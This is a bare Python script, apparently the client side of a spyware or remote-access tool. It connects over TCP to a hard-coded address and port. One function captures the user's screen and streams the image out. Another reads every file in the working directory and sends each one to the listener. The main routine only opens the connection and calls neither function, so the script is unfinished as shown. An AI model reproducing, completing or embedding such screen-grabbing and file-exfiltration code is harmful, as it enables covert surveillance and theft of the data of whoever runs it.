from pyautogui import screenshot
import socket
import io
from pwn import *
from time import sleep, time_ns

IP = '127.0.0.1'
PORT = 8000
CHUNKSIZE = 4096

def init():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    client.connect((IP, PORT))
    return client

def _screen(sock):
    _ = screenshot()
    pic = io.BytesIO()
    _.save(pic, format='PNG')
    pic = pic.getvalue()
    pic_length = len(pic)
    for i in range((pic_length // CHUNKSIZE) + 1):
        print(i)
        sock.send(pic[CHUNKSIZE*i:CHUNKSIZE*i+CHUNKSIZE])
    sock.close()

def _file(sock):
    current_dir = os.getcwd()
    files = os.listdir(current_dir)
    for file in files:
        if (os.path.isfile(file)):
            sleep(0.1)
            f = os.open(file, os.O_RDONLY)
            finf = os.fstat(f)
            print(finf.st_size)
            if file == 'client_side.py':
                continue
            with open(file, 'rb') as f:
                for _ in range((finf.st_size // CHUNKSIZE) + 1):
                    sock.send(f.read(CHUNKSIZE))
                sock.send(b'\xff\xff\xff\xff eof')


def main():
    sock = init()

if __name__=='__main__':
    main()